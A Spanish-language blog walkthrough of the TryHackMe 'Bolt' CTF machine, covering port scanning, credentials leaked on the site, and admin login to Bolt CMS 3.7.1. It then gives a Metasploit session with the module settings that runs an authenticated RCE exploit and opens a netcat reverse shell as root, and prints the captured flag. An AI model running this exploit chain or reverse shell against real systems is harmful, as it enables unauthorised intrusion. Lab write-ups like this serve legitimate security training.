---
title : "Bolt CTF Walkthrough by loh"
date: 2026-04-14 02:36:14 +0200
categories: [CTF Walkthrough]
tags: [Easy, THM, Linux, CMS, Credential-Exposure, Bolt-CMS, Authenticated-RCE, Metasploit, Reverse-Shell, Root]
---
![logo](/assets/post_img/Bolt/bolticon.png)


Comenzamos comprobando conectividad con la máquina y seguidamente realizamos un escaneo de puertos con RustScan.

Podemos ver los siguientes servicios detectados:

- SSH (22) → OpenSSH 7.6p1
- HTTP (80) → Apache 2.4.29 (página por defecto)
- HTTP (8000) → Servicio web con PHP (Bolt CMS)
```bash
❯ ping -c 4 10.130.178.150
PING 10.130.178.150 (10.130.178.150) 56(84) bytes of data.
64 bytes from 10.130.178.150: icmp_seq=1 ttl=62 time=35.2 ms
64 bytes from 10.130.178.150: icmp_seq=2 ttl=62 time=53.4 ms
64 bytes from 10.130.178.150: icmp_seq=3 ttl=62 time=41.0 ms
64 bytes from 10.130.178.150: icmp_seq=4 ttl=62 time=34.0 ms

--- 10.130.178.150 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 33.953/40.902/53.433/7.703 ms

❯ rustscan -a 10.130.178.150 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaKxKph/4I3YG+2GjzPjOevcQldxrIll8wZ8SZyy2fMg3S5tl5G6PBFbF9GvlLt1X/gadOlBc99EG3hGxvAyoujfdSuXfxVznPcVuy0acAahC0ohdGp3fZaPGJMl7lW0wkPTHO19DtSsVPniBFdrWEq9vfSODxqdot8ij2PnEWfnCsj2Vf8hI8TRUBcPcQK12IsAbvBOcXOEZoxof/IQU/rSeiuYCvtQaJh+gmL7xTfDmX1Uh2+oK6yfCn87RpN2kDp3YpEHVRJ4NFNPe8lgQzekGCq0GUZxjUfFg1JNSWe1DdvnaWnz8J8dTbVZiyNG3NAVAwP1+iFARVOkiH1hi1
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE52sV7veXSHXpLFmu5lrkk8HhYX2kgEtphT3g7qc1tfqX4O6gk5IlBUH25VUUHOhB5BaujcoBeId/pMh4JLpCs=
|   256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZwq5mZftBwFP7wDFt5kinK8mM+Gk2MaPebZ4I0ukZ+
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8000/tcp open  http    syn-ack ttl 62 (PHP 7.2.32-1)
|_http-title: Bolt | A hero is unleashed
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Accedemos al puerto 8000 y encontramos una web funcional. Revisando el contenido, observamos que se filtran credenciales directamente en el apartado de _Entries_ por parte de el administrador.
![creds](/assets/post_img/Bolt/2blog.png)

Con estas credenciales probamos rutas típicas de paneles de administración, como `/bolt/login`, consiguiendo acceso al panel del CMS.
![login](/assets/post_img/Bolt/1login.png)

Una vez dentro del panel de Bolt CMS, encontramos la versión instalada, situado en el _footer_. Con esta información procedemos a buscar posibles CVE de Bolt 3.7.1.
![dashboard](/assets/post_img/Bolt/3dashboard.png)

Buscando exploits públicos encontramos uno compatible con la versión detectada, el cual permite RCE autenticado. Para explotarlo utilizamos Metasploit buscando el módulo correspondiente al EDB-ID (_Exploit Database ID_) del CVE:
![msfconsole](/assets/post_img/Bolt/4cve.png)

Configuramos el módulo según sus necesidades (verificar con `show OPTIONS`). Lo que realmente hace este exploit es:
- Modificar temporalmente el perfil del usuario.
- Generar un archivo .php en el servidor.
- Ejecutar el payload mediante una petición HTTP.
- Limpiar el contenido generado.

```bash
msf > use 0
[*] Using configured payload cmd/unix/reverse_netcat

msf exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 192.168.134.169
LHOST => 192.168.134.169
msf exploit(unix/webapp/bolt_authenticated_rce) > set LPORT 4444
LPORT => 4444
msf exploit(unix/webapp/bolt_authenticated_rce) > set RHOST 10.130.178.150
RHOST => 10.130.178.150
msf exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf exploit(unix/webapp/bolt_authenticated_rce) > run
[*] Started reverse TCP handler on 192.168.134.169:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "ummpx".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file fjiopmfvpjip.php.
[+] Used token 525ace2a8ed13e7f1d1469c44d to create kdwfavvhw.php.
[*] Attempting to execute the payload via "/files/kdwfavvhw.php?ummpx=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (192.168.134.169:4444 -> 10.130.178.150:40530) at 2026-04-21 20:06:23 +0200
[+] Deleted file kdwfavvhw.php.
[+] Reverted user profile back to original state.
```

Finalmente obtenemos una reverse shell. En este caso, la shell obtenida ya tiene privilegios de root, por lo que no es necesaria una escalada adicional.

Pr último, usando la herramienta find, ¡encontraríamos la ansiada flag!
```bash
id 
uid=0(root) gid=0(root) groups=0(root)

pwd  
/home/bolt/public/files

find / -name "flag.txt" 2>/dev/null
/home/flag.txt

cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

Siempre es interesante encontrarse con CVE que podrían aparecer en entornos reales de empresa, aunque visto con perspectiva, a día de hoy los chicos de Bolt CMS ya van por la versión 5.1.24.

Al final hemos visto:

- Exposición de credenciales en la web
- Acceso al panel de administración de Bolt CMS
- Explotación de RCE autenticado
- Obtención directa de root

Con esto ya tendríamos nuestra octava CTF documentada en la web, un número que todavía queda lejos de mis notas en Obsidian. A por más y mejor.

Hasta la próxima,

~loh♡.